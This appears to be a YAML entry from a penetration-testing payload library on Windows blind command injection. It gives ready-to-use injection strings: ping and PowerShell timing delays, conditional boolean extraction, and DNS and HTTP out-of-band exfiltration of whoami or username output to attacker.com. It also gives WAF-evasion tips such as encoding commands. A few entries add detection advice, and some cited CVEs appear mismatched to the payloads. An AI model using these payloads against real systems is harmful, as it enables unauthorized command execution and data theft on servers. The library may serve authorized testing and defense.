- slug: windows-blind
  name: Windows Blind Command Injection
  description: Command injection on Windows where output is not visible in the HTTP response; relies on time delays and out-of-band
    channels.
  difficulty: high
  prerequisites:
  - Windows command injection where output is not reflected
  - Timing or OOB channel available
  payloads:
  - id: cmdi-wbl-001
    title: Windows ping timing delay
    payload_string: '& ping -n 5 127.0.0.1'
    how_it_works: 'On Windows, ping sends one ICMP packet per second by default, so -n 5 creates approximately a 4-second
      delay (first ping is immediate, then 4 more at 1-second intervals). This is the Windows equivalent of Unix sleep and
      is the primary timing technique for Windows blind command injection since there is no native sleep command in standard
      cmd.exe. The delay confirms injection and timing can be used for character-by-character data extraction.

      '
    prerequisites:
    - Windows server with cmd.exe execution
    - Blind injection (no output visible)
    waf_bypass_notes: ping.exe is standard and signed; rarely blocked; adjust -n for delay length
    severity_context: CVSS 9.8 – Windows blind CMDi timing confirmation via ping
    cve_refs:
    - CVE-2014-6278
    tags:
    - windows
    - blind
    - ping
    - timing
    - confirmation
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: cmdi-wbl-002
    title: PowerShell Start-Sleep
    payload_string: '& powershell -Command "Start-Sleep -Seconds 5"'
    how_it_works: 'PowerShell''s Start-Sleep cmdlet provides a sleep/delay function not natively available in cmd.exe. Combined
      with PowerShell execution via the cmd.exe & operator, this creates a reliable timing oracle for Windows blind injection.
      If PowerShell is accessible, this provides more precise timing than ping. The 5-second delay is distinct and measurable.
      It confirms that both cmd.exe injection and PowerShell execution work, opening the door to more sophisticated PowerShell-based
      exploitation.

      '
    prerequisites:
    - PowerShell accessible from cmd.exe injection
    waf_bypass_notes: Start-Sleep is a PowerShell cmdlet; use timeout /t 5 as cmd.exe alternative
    severity_context: CVSS 9.8 – PowerShell-based timing confirmation for Windows blind CMDi
    cve_refs:
    - CVE-2018-1000861
    tags:
    - windows
    - blind
    - powershell
    - sleep
    - timing
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: cmdi-wbl-003
    title: DNS exfiltration via nslookup on Windows
    payload_string: '& for /f "tokens=*" %i in (''whoami'') do nslookup %i.attacker.com'
    how_it_works: 'This Windows for-loop reads the output of whoami and substitutes it as the DNS hostname to resolve via
      nslookup. The DNS query for username.attacker.com reaches the attacker''s DNS server, exfiltrating the username via
      the DNS subdomain. This works even when HTTP egress is blocked because DNS queries typically are not restricted. The
      for-loop with backtick-equivalent syntax handles the command output substitution in cmd.exe context where backticks
      are not available.

      '
    prerequisites:
    - Windows server with nslookup (standard)
    - Outbound DNS queries to attacker's authoritative server
    waf_bypass_notes: DNS exfiltration bypasses HTTP filtering; use Burp Collaborator for DNS
    severity_context: CVSS 9.8 – Windows blind CMDi DNS exfiltration
    cve_refs:
    - CVE-2021-22205
    tags:
    - windows
    - blind
    - dns-exfil
    - nslookup
    - for-loop
    - oob
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: cmdi-wbl-004
    title: PowerShell OOB HTTP exfiltration
    payload_string: '& powershell -Command "Invoke-WebRequest -Uri (''http://attacker.com/''+[System.Environment]::UserName)
      -Method GET"'
    how_it_works: 'PowerShell''s Invoke-WebRequest (alias: curl, wget on PowerShell 3+) makes HTTP requests from the server.
      Embedding the username via [System.Environment]::UserName in the URL path exfiltrates it to the attacker''s HTTP server.
      This is the Windows equivalent of Unix curl-based OOB exfiltration. The use of .NET runtime environment properties provides
      access to system information without spawning additional processes. The attacker''s HTTP access logs record the incoming
      request with the username in the path.

      '
    prerequisites:
    - PowerShell 3.0+ available
    - Outbound HTTP to attacker server
    waf_bypass_notes: Invoke-WebRequest is a legitimate cmdlet; obfuscate by splitting the command
    severity_context: CVSS 9.8 – PowerShell HTTP OOB exfil for Windows blind CMDi
    cve_refs: []
    tags:
    - windows
    - blind
    - powershell
    - invoke-webrequest
    - oob
    - exfiltration
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: cmdi-wbl-005
    title: Conditional ping for boolean extraction
    payload_string: '& if exist C:\Windows\System32\net.exe (ping -n 5 127.0.0.1) else (ping -n 1 127.0.0.1)'
    how_it_works: 'This payload uses Windows conditional execution to test if a file exists. If the condition is true (net.exe
      exists), the long ping delay occurs; if false, a short delay. By replacing the file existence check with arbitrary conditions
      (comparing registry values, user group membership, file contents), an attacker can perform boolean-based blind extraction.
      Each request extracts one true/false bit, allowing full data extraction similar to boolean-blind SQL injection.

      '
    prerequisites:
    - cmd.exe injection on Windows
    - Measurable response timing
    waf_bypass_notes: if/exist combination is less commonly WAF-blocked than specific payloads
    severity_context: CVSS 9.8 – boolean-based Windows blind CMDi for data extraction
    cve_refs: []
    tags:
    - windows
    - blind
    - boolean-extraction
    - if-exist
    - conditional
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: cmdi-wbl-006
    title: Windows Blind CMDi via ping Time-Delay
    payload_string: '& ping -n 6 127.0.0.1 > nul

      '
    encoding: none
    how_it_works: 'The Windows ping command with -n count sends ICMP echo requests to localhost, each separated by approximately
      one second, creating a reliable time delay of (n-1) seconds that can be used to confirm blind command injection without
      any outbound network traffic. Unlike Unix sleep, ping.exe is universally available on all Windows versions and does
      not require additional tooling, making it the most portable Windows blind injection confirmation primitive across server
      environments including IIS, Apache on Windows, and embedded Windows-based appliances. Defenders should monitor process-creation
      events for ping.exe spawned as a child of non-interactive parent processes (e.g., w3wp.exe, java.exe, tomcat) via EDR
      or Windows Event ID 4688 with command-line auditing; this behavioural anomaly is a reliable detection signal because
      legitimate web servers never invoke ping as a child process during normal operation.

      '
    context_of_use: Any Windows CMDi context where output is suppressed and no outbound traffic is permitted
    prerequisites:
    - cmd.exe injection context on Windows
    waf_bypass_notes: Vary -n count; substitute 127.0.0.1 with 0.0.0.0 on some versions
    severity_context: CVSS 7.5 – confirms blind CMDi presence via measurable HTTP response delay
    cve_refs: []
    tags:
    - windows
    - blind
    - ping
    - time-delay
    - confirmation
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: cmdi-wbl-007
    title: Windows Blind CMDi via DNS Lookup with nslookup
    payload_string: '& nslookup attacker.com

      '
    encoding: none
    how_it_works: 'nslookup is a standard Windows binary that performs DNS resolution; when injected as a blind CMDi payload,
      it triggers an outbound DNS query to the attacker''s domain, confirming code execution through the DNS server logs without
      requiring direct HTTP egress from the target. Unlike curl/wget-based OOB techniques, nslookup only requires DNS egress
      (UDP/53), which is permitted on virtually all corporate networks as a baseline network function. The attacker monitors
      their authoritative DNS server for the query to confirm execution and can encode exfiltrated data as subdomains for
      data exfiltration.

      '
    context_of_use: Windows blind CMDi on networks where TCP egress is blocked but DNS is permitted
    prerequisites:
    - nslookup.exe present (standard on all Windows versions)
    - Outbound DNS (UDP/53) from server to attacker's name server
    waf_bypass_notes: 'nslookup with custom server: nslookup data.attacker.com attacker-ns.com'
    severity_context: CVSS 8.0 – OOB DNS confirmation of blind Windows CMDi
    cve_refs: []
    tags:
    - windows
    - blind
    - dns-oob
    - nslookup
    - oob-confirmation
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: cmdi-wbl-008
    title: Windows Blind CMDi via PowerShell Invoke-WebRequest OOB
    payload_string: '& powershell -c "Invoke-WebRequest -Uri http://attacker.com/$(whoami)"

      '
    encoding: none
    how_it_works: 'PowerShell''s Invoke-WebRequest cmdlet (alias iwr) sends an HTTP GET to the specified URI; by interpolating
      the output of a sub-expression like $(whoami) into the URL path, an attacker receives the executed command''s output
      directly in their HTTP access logs, turning a blind injection into an out-of-band data exfiltration channel. PowerShell
      string interpolation evaluates sub-expressions before URI construction, allowing arbitrary command substitution without
      shell pipeline operators that may be filtered by the target application''s input sanitization. Defenders can disrupt
      this OOB channel by enabling PowerShell Constrained Language Mode (CLM) via AppLocker or Windows Defender Application
      Control (WDAC) policies, which restricts sub-expression evaluation and prevents Invoke-WebRequest from executing in
      untrusted script contexts; network-layer egress filtering on HTTP/HTTPS from application server processes provides a
      complementary defence-in-depth control.

      '
    context_of_use: Windows blind CMDi on hosts where PowerShell is available and HTTP egress is permitted
    prerequisites:
    - PowerShell 3.0+ (Invoke-WebRequest available)
    - Outbound HTTP from server process
    waf_bypass_notes: Alias iwr; encode the whole cmdlet with -EncodedCommand to bypass keyword filters
    severity_context: CVSS 9.0 – OOB data exfiltration via PowerShell HTTP confirms and exploits blind Windows CMDi
    cve_refs: []
    tags:
    - windows
    - blind
    - powershell
    - invoke-webrequest
    - oob
    - data-exfil
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
